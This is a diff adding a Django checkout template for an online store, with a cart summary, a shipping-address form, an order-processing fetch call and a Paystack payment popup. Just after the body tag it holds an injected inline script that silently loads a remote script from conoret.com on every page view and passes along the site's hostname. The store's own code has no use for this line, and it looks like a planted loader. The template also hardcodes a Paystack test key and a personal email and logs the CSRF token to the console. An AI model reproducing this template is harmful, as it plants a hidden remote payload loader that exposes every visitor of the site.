@@ -1,0 +1,198 @@
+{% extends 'store/main.html' %}
+{% load static %}
+{% block content %}
+<body class="bg-light"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+
+  <div class="container">
+    <div class="py-5 text-center">
+      </div>
+
+    <div class="row">
+      <div class="col-md-4 order-md-2 mb-4">
+        <h4 class="d-flex justify-content-between align-items-center mb-3">
+          <span class="text-muted">Your cart</span>
+          <span class="badge badge-secondary badge-pill">{{ order.get_cart_items }}</span>
+        </h4>
+        <ul class="list-group mb-3">
+          {% for item in items %}
+          <li class="list-group-item d-flex justify-content-between lh-condensed">
+            <div>
+              <h6 class="my-0">{{ item.product.name }}</h6>
+            </div>
+            <span class="text-muted"> <strong>N</strong> {{ item.get_total_price }}</span>
+          </li>
+          {% endfor %}
+          <li class="list-group-item d-flex justify-content-between bg-light">
+            <div class="text-success">
+              <h6 class="my-0">Total</h6>
+            </div>
+            <span class="text-success">N {{ order.get_cart_total }}</span>
+          </li>
+        </ul>
+
+        
+        </form>
+      </div>
+      <div class="col-md-8 order-md-1">
+        <h4 id="shipping-title" class="mb-3">Shipping address</h4>
+        <form class="needs-validation" id="form" novalidate="">
+          {% csrf_token %}
+          <div id="user-info">
+              <div class="mb-3">
+                <label for="name">Name</label>
+                <input type="text" name="name" class="form-control" id="name" placeholder="John Jones" value="" required="">
+                <div class="invalid-feedback">
+                  Valid name is required.
+                </div>
+              </div>
+
+            <div class="mb-3">
+              <label for="number">Phone Number</label>
+              <input type="number" name="number" class="form-control" id="email" placeholder="09094620483" required="">
+              <div class="invalid-feedback">
+                Please enter a valid phone number for accurate delivery service.
+              </div>
+            </div>
+        </div>
+
+          <div class="mb-3">
+            <label for="address2">Address</label>
+            <input name="address2" type="text" class="form-control" id="address2" placeholder="14 Kevin Street">
+          </div>
+
+          <div class="mb-3">
+            <label for="city">City</label>
+            <input name="city" type="text" class="form-control" id="city" placeholder="Ikeja">
+          </div>
+
+
+
+
+          <div class="mb-3">
+            <label for="state">State</label>
+            <input type="text" name="state" class="form-control" id="address" placeholder="Lagos" required="">
+            <div class="invalid-feedback">
+              State
+            </div>
+          </div>
+          
+          <!-- <hr class="mb-4">
+          <div class="custom-control custom-checkbox">
+            <input type="checkbox" class="custom-control-input" id="same-address">
+            <label class="custom-control-label" for="same-address">Shipping address is the same as my billing address</label>
+          </div>
+          <div class="custom-control custom-checkbox">
+            <input type="checkbox" class="custom-control-input" id="save-info">
+            <label class="custom-control-label" for="save-info">Save this information for next time</label>
+          </div> -->
+          
+            
+          <hr class="mb-4">
+          <button class="btn btn-primary btn-lg btn-block" style="margin-bottom: 10px;" id="submit-form" type="submit">Continue</button>
+        </form>
+
+        <form id="paymentForm">
+          <div class="form-submit">
+            <button type="submit" onclick="payWithPaystack()"> Pay </button>
+          </div>
+      </form>
+      
+        
+      </div>
+    </div>
+  </div>
+<script type="text/javascript">
+  var shipping = '{{ order.shipping }}'
+  var total = '{{ order.get_cart_total }}'
+  var form = document.getElementById('form')
+  csrftoken = form.getElementsByTagName("input")[0].value
+  console.log('New Token: ', csrftoken)
+  form.addEventListener('submit', function(e){
+    e.preventDefault()
+    console.log('Form submitted...')
+  })
+
+  if (user != 'AnonymousUser'){
+    document.getElementById('user-info').innerHTML = ''
+  }
+
+
+  
+
+  function submitFormData(){
+    
+    console.log('Payment button clicked')
+    var userFormData = {
+      'name': null,
+      'number': null,
+      'total': total
+    }
+
+    var shippingInfo = {
+      'address2': form.address2.value,
+      'city': form.city.value,
+      'state': form.state.value
+    }
+
+    if(user == 'AnonymousUser'){
+      userFormData.name = form.name.value,
+      userFormData.number = form.number.value
+    }
+
+
+    var url = '/process-order/'
+
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-CSRFToken': csrftoken
+      },
+      body: JSON.stringify({'form': userFormData, 'shipping': shippingInfo})
+    })
+  
+    .then((response) => response.json())
+
+    .then((data) => {
+      console.log('Success: ', data);
+      cart = {}
+      document.cookie = 'cart=' + JSON.stringify(cart) + ";domain=;path=/"
+    })
+    
+
+  }
+
+ 
+</script>
+
+<script>
+  var total = '{{ order.get_cart_total }}'
+  const paymentForm = document.getElementById('paymentForm');
+  paymentForm.addEventListener("submit", payWithPaystack, false);
+  function payWithPaystack(e) {
+  e.preventDefault();
+  let handler = PaystackPop.setup({
+      key: 'pk_test_78a789f6b4d654990ba6c6ae8f8e602205f0c4f4', // Replace with your public key
+      email: 'worklikecollins@gmail.com',
+      amount: '{{order.get_cart_total}}' * 100,
+      ref: ''+Math.floor((Math.random() * 1000000000) + 1), // generates a pseudo-unique reference. Please replace with a reference you generated. Or remove the line entirely so our API will generate one for you
+      // label: "Optional string that replaces customer email"
+      onClose: function(){
+      alert('Window closed.');
+      },
+      callback: function(response){
+      let message = 'Payment complete! Reference: ' + response.reference;
+      alert(message);
+      window.location.href = "{% url 'store' %}"
+      }
+      
+  });
+  submitFormData()
+
+  console.log(total)
+
+  handler.openIframe();
+  }
+</script>
+<script src="https://js.paystack.co/v1/inline.js"></script> 
+{% endblock content %}
